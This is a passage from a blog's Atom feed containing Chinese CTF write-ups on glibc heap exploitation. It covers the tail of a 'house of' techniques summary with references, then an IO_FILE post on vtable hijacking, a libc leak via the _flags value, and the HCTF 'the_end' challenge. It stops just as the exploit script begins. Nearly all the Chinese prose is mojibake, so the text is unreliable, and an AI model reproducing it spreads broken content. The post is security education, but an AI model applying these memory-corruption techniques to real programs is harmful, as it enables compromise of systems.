<code>reused_arena</code>ï¼Œå°±èƒ½æŠŠ <code>fake arena</code> ç»™ <code>thread_arena</code> å˜é‡</li><li>æœ€åç›´æ¥ä¼ªé€  <code>fastbin</code> ä»»æ„åœ°å€åˆ†é…</li></ul><h3 id="ç›¸å…³æŠ€å·§-27"><a href="#ç›¸å…³æŠ€å·§-27" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>ä»…ä»…å€ŸåŠ© <code>unsortedbin</code> é“¾å°±èƒ½æ§åˆ¶ <code>main_arena</code> çš„ <code>next</code> å’Œ <code>system_mem</code></li><li>åˆ©ç”¨ <code>binmap</code> çš„å€¼æ„é€ å‡ºåˆæ³•çš„ <code>size</code></li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-26"><a href="#åˆ©ç”¨æ•ˆæœ-26" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>åŠ«æŒ <code>thread_arena</code> ä¸º <code>fake_arena</code></li></ul><h1 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3 - æ€»ç»“"></a>3 - æ€»ç»“</h1><ul><li>æ€»ç»“äº† <code>28</code> ç§ <code>house of</code> ç³»åˆ—åˆ©ç”¨æ‰‹æ³•</li><li>ç»™å‡ºäº†æ¯ç§åˆ©ç”¨æ‰‹æ³•çš„å½±å“ç‰ˆæœ¬ã€é€‚ç”¨èŒƒå›´ã€åˆ©ç”¨åŸç†ç­‰</li><li>æ‰€æœ‰çš„åˆ©ç”¨æ–¹æ³•éƒ½å¯ä»¥åœ¨æºç ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œå› æ­¤å¼ºçƒˆå»ºè®®å°†æºç åå¤é˜…è¯»</li><li>å¯ä»¥æ ¹æ®ç›®å‰å·²æœ‰çš„æŠ€æœ¯æå‡ºæ–°çš„ç»„åˆæŠ€</li></ul><h1 id="4-å‚è€ƒ"><a href="#4-å‚è€ƒ" class="headerlink" title="4 - å‚è€ƒ"></a>4 - å‚è€ƒ</h1><p>[1] <a href="https://www.anquanke.com/post/id/244158">å †åˆ©ç”¨ç³»åˆ—ä¹‹ house of spirit - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[2] <a href="https://github.com/shellphish/how2heap">shellphish/how2heap: A repository for learning various heap exploitation techniques. (github.com)</a></p><p>[3] <a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></p><p>[4] [<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_1">åŸåˆ›] CTF ä¸­ glibc å †åˆ©ç”¨ åŠ IO_FILE æ€»ç»“ - Pwn - çœ‹é›ªè®ºå› - å®‰å…¨ç¤¾åŒº | å®‰å…¨æ‹›è˜ | bbs.pediy.com (kanxue.com)</a></p><p>[5] <a href="https://www.anquanke.com/post/id/251596">PWNâ€”â€”House Of Einherjar CTF Wiki ä¾‹é¢˜è¯¦è§£ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[6] <a href="https://www.anquanke.com/post/id/175630">Top chunk åŠ«æŒï¼šHouse of force æ”»å‡» - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[7] <a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/">House of Lore - CTF Wiki (ctf-wiki.org)</a></p><p>[8] <a href="https://www.anquanke.com/post/id/218887">House of orange - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[9] <a href="http://p4nda.top/2018/04/18/house-of-rabbit/">house of rabbit</a></p><p>[10] <a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-roman/">House of Roman - CTF Wiki (ctf-wiki.org)</a></p><p>[11] <a href="https://www.anquanke.com/post/id/203096">House of storm åŸç†åŠåˆ©ç”¨ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[12] <a href="https://xz.aliyun.com/t/6862#toc-5">House-of-Corrosion ä¸€ç§æ–°çš„å †åˆ©ç”¨æŠ€å·§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>[13] <a href="https://www.anquanke.com/post/id/202387">house-of-husk å­¦ä¹ ç¬”è®° - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[14] <a href="https://www.anquanke.com/post/id/254797">House of Muney åˆ†æ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[15] <a href="https://forum.butian.net/share/1709">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº - æ·±å…¥ç†è§£ House of Botcake å †åˆ©ç”¨æ‰‹æ³• (butian.net)</a></p><p>[16] <a href="https://github.com/c4ebt/House-of-Rust">c4ebt/House-of-Rust: The House of Rust is a heap exploitation technique that drops a shell against full PIE binaries that donâ€™t leak any addresses. (github.com)</a></p><p>[17] <a href="https://www.anquanke.com/post/id/222948">house of banana - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[18] <a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[19] <a href="https://www.anquanke.com/post/id/260614">house of emma</a></p><p>[20] <a href="https://www.anquanke.com/post/id/242640">house of pig ä¸€ä¸ªæ–°çš„å †åˆ©ç”¨è¯¦è§£ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>[21] <a href="https://tttang.com/archive/1845/">ä¸€æ¡æ–°çš„ glibc IO_FILE åˆ©ç”¨é“¾ï¼š_IO_obstack_jumps åˆ©ç”¨åˆ†æ - è·³è·³ç³– (tttang.com)</a></p><p>[22] <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple ä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³• (1) - roderick - record and learn! (roderickchan.cn)</a></p><p>[23] <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple ä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³• (2) - roderick - record and learn! (roderickchan.cn)</a></p><p>[24] <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/">House of Apple ä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³• (3) - roderick - record and learn! (roderickchan.cn)</a></p><p>[25] <a href="https://www.roderickchan.cn/2022-06-18-glibcheap-house-of-muney/">GlibcHeap-house of muney - roderick - record and learn! (roderickchan.cn)</a></p><p>[26] <a href="https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT">house-of-gods/HOUSE_OF_GODS.TXT at master Â· Milo-D/house-of-gods (github.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è½¬è½½è‡ª&lt;a href=&quot;https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#1-%E5%89%8D%E8%A8%80&quot;&gt;Glibcå †åˆ©ç”¨ä¹‹house</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of ç³»åˆ—" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>IO_Fileçš„åˆ©ç”¨</title>
    <link href="https://kylinxin.github.io/2023/11/21/IO_File%E5%88%A9%E7%94%A8/"/>
    <id>https://kylinxin.github.io/2023/11/21/IO_File%E5%88%A9%E7%94%A8/</id>
    <published>2023-11-21T15:14:29.000Z</published>
    <updated>2023-11-21T15:02:22.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ã€PWNã€‘IO-FILEçš„åˆ©ç”¨"><a href="#ã€PWNã€‘IO-FILEçš„åˆ©ç”¨" class="headerlink" title="ã€PWNã€‘IO_FILEçš„åˆ©ç”¨"></a>ã€PWNã€‘IO_FILEçš„åˆ©ç”¨</h1><p>æ­¤ç¯‡ç®€å•çš„å­¦ä¹ ä¸€ä¸‹IO_Fileçš„åˆ©ç”¨</p><h2 id="IO-FILE-çš„ç»“æ„"><a href="#IO-FILE-çš„ç»“æ„" class="headerlink" title="IO_FILE çš„ç»“æ„"></a>IO_FILE çš„ç»“æ„</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> {</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br> <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it's too small.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>};<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">{</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don't get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>};<br></code></pre></td></tr></tbody></table></figure><p> IO_FILEå®é™…ä¸Šè¿˜åŒ…æ‹¬åœ¨ä¸€ä¸ªIO_FILE_plusä¸­</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">{</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>}<br></code></pre></td></tr></tbody></table></figure><p>åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable åç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8 </p><p>IO_FILE_plusç»“æ„é€šè¿‡é“¾è¡¨é“¾æ¥</p><pre><code>    åˆå§‹æ—¶å½¢æˆä»¥ä¸‹é¡ºåºï¼š    _IO_list_all  -&gt; _IO_2_1_stderr_ -&gt;  _IO_2_1_stdout_  -&gt;  _IO_2_1_stdin_</code></pre><p>_IO_list_all æ˜¯ä¸€ä¸ªé“¾è¡¨å¤´</p><p>åé¢ä¸‰ä¸ªæ–‡ä»¶æ˜¯ä¸‰ä¸ªè‡ªåŠ¨opençš„æ–‡ä»¶ï¼Œå®ƒä»¬çš„æ–‡ä»¶æè¿°ç¬¦ä¸º2ï¼Œ1ï¼Œ0</p><p>stdinå¯¹åº”0ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥çŒœæƒ³å¹³å¸¸å†™çš„read(0,xxx,xxx)ä¸write(1,xxx,xxx)æ˜¯ä½•å«ä¹‰ï¼Œæˆ‘ä»¬çš„ioè¾“å…¥è¾“å‡ºè¢«æŠ½è±¡æˆäº†æ–‡ä»¶è¾“å…¥è¾“å‡º</p><p>å‡è®¾æˆ‘ä»¬open fileï¼Œå…¶ä¼šè¢«æ’å…¥åˆ°é“¾è¡¨å¤´ä½ç½®ï¼Œç±»ä¼¼æˆ‘ä»¬ä¹‹å‰å­¦çš„fastbin æ’å…¥ã€‚</p><p>å®ƒä»¬ä¼šå­˜åœ¨å“ªé‡Œï¼Ÿ</p><p>è‡ªåŠ¨å¼€å¯çš„ä¸‰ä¸ªæ–‡ä»¶ç»“æ„ï¼ˆIO_FILE_plus)ä¼šè¢«å­˜æ”¾åœ¨libcä¸­ï¼Œåç»­æ‰‹åŠ¨å¼€å¯çš„åˆ™ä¼šè¢«åˆ†é…åœ¨å †åŒºã€‚</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables<br>.data:00000000003C5700                 public stderr<br>.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_<br>.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0â†‘o<br>.data:00000000003C5700                                         ; fclose+F2â†‘r ...<br>.data:00000000003C5708                 public stdout<br>.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_<br>.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48â†‘o<br>.data:00000000003C5708                                         ; fclose+E9â†‘r ...<br>.data:00000000003C5710                 public stdin<br>.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_<br>.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8â†‘o<br>.data:00000000003C5710                                         ; fclose:loc_6D340â†‘r ...<br>.data:00000000003C5718                 dq offset sub_20B70<br>.data:00000000003C5718 _data           ends<br>.data:00000000003C5718<br>.bss:00000000003C5720 ; ===========================================================================<br></code></pre></td></tr></tbody></table></figure><p>é‚£ä¹ˆä»€ä¹ˆæ˜¯ *vtableé¡¹å‘¢ï¼Ÿ</p><p>*vtableæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªè™šè¡¨ã€‚è¯¥è™šè¡¨ä¸­å­˜æ”¾äº†</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * funcs[] = {<br>   <span class="hljs-number">1</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// "extra word"</span><br>   <span class="hljs-number">2</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// DUMMY</span><br>   <span class="hljs-number">3</span> <span class="hljs-built_in">exit</span>, <span class="hljs-comment">// finish</span><br>   <span class="hljs-number">4</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// overflow</span><br>   <span class="hljs-number">5</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// underflow</span><br>   <span class="hljs-number">6</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// uflow</span><br>   <span class="hljs-number">7</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// pbackfail</span><br>   <br>   <span class="hljs-number">8</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsputn  #printfåé¢è®²è§£æ‰§è¡Œæµç¨‹ç« èŠ‚ä¼šç”¨åˆ°æ­¤å¤„</span><br>   <span class="hljs-number">9</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsgetn</span><br>   <span class="hljs-number">10</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekoff</span><br>   <span class="hljs-number">11</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekpos</span><br>   <span class="hljs-number">12</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// setbuf</span><br>   <span class="hljs-number">13</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// sync</span><br>   <span class="hljs-number">14</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// doallocate</span><br>   <span class="hljs-number">15</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// read</span><br>   <span class="hljs-number">16</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// write</span><br>   <span class="hljs-number">17</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seek</span><br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-comment">// close</span><br>   <span class="hljs-number">19</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// stat</span><br>   <span class="hljs-number">20</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// showmanyc</span><br>   <span class="hljs-number">21</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// imbue</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬è¿˜æ˜¯éšä¾¿æ‰“å¼€ä¸€ä¸ªç¨‹åºï¼Œdbgçœ‹çœ‹å®ƒçš„ç¤ºä¾‹å§</p><p class='item-img' data-src='https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png'><img src="https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png" alt="image.png"></p><p>é€šè¿‡ p _IO_list_all æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹è¯¥ç¬¦å·çš„åœ°å€</p><blockquote><p>p  *(struct _IO_FILE_plus *) _IO_list_all</p></blockquote><p class='item-img' data-src='https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png'><img src="https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png" alt="image.png"></p><p>æˆ‘ä»¬è¿™é‡Œå¯ä»¥çœ‹åˆ°vtableé¡¹ã€filenoé¡¹ä¸_chainé¡¹</p><p>_chainé¡¹æŒ‡å‘ä¸‹ä¸€ä¸ªè¡¨ï¼Œå¦‚stderrçš„chainçš„å€¼å°±æ˜¯stdoutçš„åœ°å€ï¼Œfilenoå­˜çš„å°±æ˜¯è¯¥æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªè™šè¡¨æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ</p><blockquote><p>_IO_putsåœ¨è¿‡ç¨‹å½“ä¸­è°ƒç”¨äº†ä¸€ä¸ªå«åš<code>_IO_sputn</code>å‡½æ•°ï¼ˆ_IO_fwriteä¹Ÿä¼šè°ƒç”¨è¿™ä¸ªï¼‰ï¼Œ_IO_sputnå…¶å®æ˜¯ä¸€ä¸ª<code>å®</code>ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯è°ƒç”¨<code>_IO_2_1_stdout_</code>ä¸­çš„<code>vtable</code>æ‰€æŒ‡å‘çš„<code>_xsputn</code>ï¼Œä¹Ÿå°±æ˜¯<code>_IO_new_file_xsputn</code>å‡½æ•°</p></blockquote><p>è¿™ä¸ªè™šè¡¨å­˜æ”¾åœ¨å“ªé‡Œï¼Ÿ</p><p>è¿™ä¸ªè™šè¡¨ä¹Ÿå­˜æ”¾åœ¨äº†dataåŒºï¼Œè¿˜è®°å¾—ä¸Šé¢æœ‰å¼ å›¾å§ï¼Œå…¶å°±åœ¨stderrçš„ä¸Šé¢ã€‚</p><p> æ—¥å¸¸æ‰€ç”¨çš„è¾“å…¥è¾“å‡ºå‡½æ•°ä¼šè°ƒç”¨è™šè¡¨ä¸­çš„å‡½æ•°</p><blockquote><p>fread-&gt;_IO_XSGETN<br>fwrite-&gt;_IO_XSPUTN<br>fopen-&gt;malloc a new file struct-&gt;make file vtable-&gt;initialization file struct-&gt;puts initialzation file in file struct<br>fclose -&gt;_IO_unlink_it-&gt;_IO_file_close_it-&gt;_IO_file_finish(_IO_FINISH)</p></blockquote><p>å¦‚putsä¼šè°ƒç”¨è™šè¡¨ä¸­çš„_xsputnï¼Œè€Œç»è¿‡ä¸€ç³»åˆ—æ“ä½œï¼Œæœ€ç»ˆä¼šç³»ç»Ÿè°ƒç”¨writeã€‚</p><h2 id="åˆ©ç”¨-IO-2-1-stdoutæ³„éœ²libc"><a href="#åˆ©ç”¨-IO-2-1-stdoutæ³„éœ²libc" class="headerlink" title="åˆ©ç”¨_IO_2_1_stdoutæ³„éœ²libc"></a>åˆ©ç”¨_IO_2_1_stdoutæ³„éœ²libc</h2><p> iofileçš„ç›¸å…³åˆ©ç”¨ï¼Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„æ•ˆæœå°±æ˜¯æ³„éœ²libcã€‚</p><p>è®¾ç½®flagä½ç»•è¿‡æ£€æµ‹</p><blockquote><p>_flags = 0xFBAD1800</p></blockquote><p>ä¼ªé€  vtable åŠ«æŒç¨‹åºæµç¨‹<br>ç”±äºæˆ‘ä»¬è°ƒç”¨ioå‡½æ•°æ—¶ï¼Œå…¶æœ€ç»ˆä¼šæŒ‡å‘vtableçš„å‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹å˜vtableå¯¹åº”é¡¹æˆ–æ”¹å˜vtableæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘å¯åˆ©ç”¨ä½ç½®ï¼Œå†åœ¨ç›¸åº”ä½ç½®å¡«å†™ç›®æ ‡å‡½æ•°ã€‚</p><p>åœ¨ libc2.23 ä¹‹å‰ï¼Œè¿™äº› vtable æ˜¯å¯ä»¥å†™å…¥å¹¶ä¸”ä¸å­˜åœ¨å…¶ä»–æ£€æµ‹çš„ã€‚æ¢è¨€ä¹‹ï¼Œ2.23åŠä»¥åï¼Œåªèƒ½é€šè¿‡ä¿®æ”¹vtableæŒ‡é’ˆå†è¿›è¡Œåˆ©ç”¨äº†ã€‚</p><p><strong>ä¸¾ä¾‹2018 HCTF the_end</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png'><img src="https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png" alt="image.png"></p><p>ç”±äº<a href="https://so.csdn.net/so/search?q=sleep%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">sleepå‡½æ•°</a>åœ°å€æ³„éœ²ï¼Œæ‰€ä»¥å¯ä»¥è·å¾—åŸºå€ï¼Œäºæ˜¯å¾—åˆ°åç§»åè™šè¡¨æŒ‡é’ˆåœ°å€ï¼Œone_gadgetåœ°å€ã€‚</p><p>é¢˜ç›®æ‹¥æœ‰5å­—èŠ‚ä»»æ„åœ°å€ä¿®æ”¹èƒ½åŠ›ã€‚</p><p>æœ¬é¢˜æˆ‘ä»¬åˆ©ç”¨çš„æ˜¯ï¼š</p><ul><li>åœ¨ç¨‹åºè°ƒç”¨ <code>exit</code> åï¼Œä¼šéå† <code>_IO_list_all</code> ï¼Œè°ƒç”¨ <code>_IO_2_1_stdout_</code> ä¸‹çš„ <code>vtable</code> ä¸­ <code>_setbuf</code> å‡½æ•°ã€‚</li></ul><p>setbufåœ¨è™šè¡¨0x58åç§»å¤„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦†ç›–è™šè¡¨æŒ‡é’ˆçš„æ•°å€¼ä¸º ä¼ªé€ å¤„åœ°å€-0x58</p><p>expï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 